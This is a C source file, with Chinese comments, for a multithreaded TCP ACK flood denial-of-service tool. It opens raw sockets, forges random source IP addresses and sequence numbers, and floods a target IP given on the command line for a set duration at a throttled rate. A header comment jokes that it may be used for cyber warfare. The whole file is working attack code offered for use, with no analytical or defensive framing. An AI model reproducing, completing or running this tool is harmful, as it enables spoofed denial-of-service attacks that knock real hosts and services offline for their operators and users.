/*
        This is released under the GNU GPL License v3.0, and is allowed to be used for cyber warfare. ;)
*/
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

// 定义最大数据包大小
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9 // 随机数生成算法中的常量
static unsigned long int Q[4096], c = 362436; // 随机数数组和初始值
volatile int limiter; // 用于限制发送速率的变量
volatile unsigned int pps; // 每秒发送的数据包数量
volatile unsigned int sleeptime = 100; // 休眠时间（微秒）

// 初始化随机数生成器
void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++)
        {
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
        }
}

// CMWC随机数生成函数
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c)
        {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

// 计算校验和
unsigned short csum(unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while (count > 1)
        {
                sum += *buf++;
                count -= 2;
        }
        if (count > 0)
        {
                sum += *(unsigned char *)buf;
        }
        while (sum >> 16)
        {
                sum = (sum & 0xffff) + (sum >> 16);
        }
        return (unsigned short)(~sum);
}

// 计算TCP校验和
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{
        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr = iph->saddr;
        pseudohead.dst_addr = iph->daddr;
        pseudohead.zero = 0;
        pseudohead.proto = IPPROTO_TCP;
        pseudohead.length = htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
        unsigned short output = csum(tcp, totaltcp_len);
        free(tcp);
        return output;
}

// 设置IP头部
void setup_ip_header(struct iphdr *iph)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htonl(54321);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = 6;
        iph->check = 0;
        iph->saddr = inet_addr("192.168.3.100");
}

// 设置TCP头部
void setup_tcp_header(struct tcphdr *tcph)
{
        tcph->source = htons(5678);
        tcph->seq = rand();
        tcph->ack_seq = 1;
        tcph->res2 = 0;
        tcph->doff = 5;
        tcph->ack = 1;
        tcph->window = htons(65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;
}

// 发送数据包线程
void *flood(void *par1)
{
        char *td = (char *)par1; // 目标IP地址
        char datagram[MAX_PACKET_SIZE]; // 数据包缓冲区
        struct iphdr *iph = (struct iphdr *)datagram; // IP头部指针
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr); // TCP头部指针
        struct sockaddr_in sin; // 目标地址结构体
        sin.sin_family = AF_INET;
        sin.sin_port = htons(rand() % 20480); // 随机端口
        sin.sin_addr.s_addr = inet_addr(td); // 目标IP地址

        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // 创建原始套接字
        if (s < 0)
        {
                fprintf(stderr, ":: cant open raw socket. got root?\n");
                exit(-1);
        }

        memset(datagram, 0, MAX_PACKET_SIZE); // 清空数据包
        setup_ip_header(iph); // 设置IP头部
        setup_tcp_header(tcph); // 设置TCP头部
        tcph->dest = htons(rand() % 20480); // 设置目标端口
        iph->daddr = sin.sin_addr.s_addr; // 设置目标IP地址
        iph->check = csum((unsigned short *)datagram, iph->tot_len); // 计算IP头部校验和

        int tmp = 1;
        const int *val = &tmp;
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
        {
                fprintf(stderr, ":: motherfucking error.\n");
                exit(-1);
        }

        init_rand(time(NULL)); // 初始化随机数生成器
        register unsigned int i;
        i = 0;
        while (1)
        {
                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)); // 发送数据包
                iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF); // 更新源IP地址
                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF); // 更新IP标识符
                iph->check = csum((unsigned short *)datagram, iph->tot_len); // 重新计算IP校验和
                tcph->seq = rand_cmwc() & 0xFFFF; // 更新TCP序列号
                tcph->source = htons(rand_cmwc() & 0xFFFF); // 更新TCP源端口
                tcph->check = 0; // 清空TCP校验和
                tcph->check = tcpcsum(iph, tcph); // 计算TCP校验和
                pps++; // 增加发送计数
                if (i >= limiter)
                {
                        i = 0;
                        usleep(sleeptime); // 控制发送速率
                }
                i++;
        }
}

// 主函数
int main(int argc, char *argv[])
{
        if (argc < 5)
        {
                fprintf(stderr, "Invalid parameters!\n");
                fprintf(stdout, "Usage: %s <IP> <threads> <throttle, -1 for no throttle> <time>\n", argv[0]);
                exit(-1);
        }
        int num_threads = atoi(argv[2]); // 线程数量
        int maxpps = atoi(argv[3]); // 最大数据包每秒发送数
        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads]; // 线程数组
        int multiplier = 20;
        int i;
        for (i = 0; i < num_threads; i++)
        {
                pthread_create(&thread[i], NULL, &flood, (void *)argv[1]); // 创建线程
        }
        fprintf(stdout, ":: sending all the packets..\n");
        for (i = 0; i < (atoi(argv[4]) * multiplier); i++) // 运行指定时间
        {
                usleep((1000 / multiplier) * 1000);
                if ((pps * multiplier) > maxpps) // 调整发送速率
                {
                        if (1 > limiter)
                        {
                                sleeptime += 100;
                        }
                        else
                        {
                                limiter--;
                        }
                }
                else
                {
                        limiter++;
                        if (sleeptime > 25)
                        {
                                sleeptime -= 25;
                        }
                        else
                        {
                                sleeptime = 0;
                        }
                }
                pps = 0;
        }
        return 0;
}